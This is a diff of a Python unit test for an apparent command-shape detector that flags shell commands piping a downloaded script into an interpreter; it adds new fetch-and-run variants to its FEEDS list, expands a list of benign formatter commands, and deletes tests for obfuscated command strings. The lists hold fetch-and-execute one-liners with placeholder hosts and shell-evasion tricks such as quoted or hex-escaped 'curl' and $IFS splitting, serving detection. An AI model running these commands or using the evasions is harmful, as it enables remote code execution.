@@ -20,12 +20,14 @@ FEEDS = ["curl -s u | tee x | sh", "wget -O- u | env sh", "curl u | sudo sh", "c
          "bash < <(curl -s u)", '"cu"rl u | sh', "c'u'rl u | sh",
          "bash -o pipefail -c 'curl -s u | tee y | sh'", "$'\\x63url' -s u | sh", "nc e 80 | sh",
          "ssh h cat x | sh", "curl u | xargs sh -c", "curl u | python3 -",
-         "sh -c 'sh -c \"curl u|sh\"'", "timeout -s KILL 9 bash -c 'curl u | sh'"]
+         "sh -c 'sh -c \"curl u|sh\"'", "timeout -s KILL 9 bash -c 'curl u | sh'",
+         "curl u | bash -s -- a", ". <(curl u)", "source <(curl u)"]
 FORMATTERS = ["curl -s https://api/x | python3 -m json.tool", "curl -s u | awk '{print $1}'",
               "ssh build cat /srv/f | gawk -f fmt.awk", "bash -c 'diff <(curl -s u) \"$1\"' _",
-              "curl -o out.json u | jq ."]
-NOT_PLAIN_WORDS = ["env -S 'sh -c id'", "sh$IFS-c$IFS'id'", "wget -qO .x u\nsh .x",
-                   "git -c alias.x=!id x", "R -e 'system(1)'", "a ${1}", "a $10x", "a \\$1"]
+              "curl -o out.json u | jq .", "ssh host cat f | sh ./render.sh",
+              "curl -s u | bash tools/fmt.sh", "diff -r . <(curl -s u)", "cmp . <(ssh host cat x)",
+              "curl u | node --check", "curl u | php -l", "curl u | ruby -c", "curl u | bash -n",
+              "curl u | r2 -q -"]
 
 
 class TestAPlainProgramCall(unittest.TestCase):
@@ -56,18 +58,6 @@ class TestADownloadFedToARunner(unittest.TestCase):
         for text in FORMATTERS:
             with self.subTest(text=text):
                 self.assertFalse(command_shape.feeds_a_download_to_a_runner(text))
-
-
-class TestPlainWords(unittest.TestCase):
-    def test_a_plain_call_has_its_words(self):
-        for text in PLAIN:
-            with self.subTest(text=text):
-                self.assertIsNotNone(command_shape.plain_words(text))
-
-    def test_anything_a_shell_would_read_differently_has_none(self):
-        for text in NOT_PLAIN_WORDS:
-            with self.subTest(text=text):
-                self.assertIsNone(command_shape.plain_words(text))
 
 
 if __name__ == "__main__":
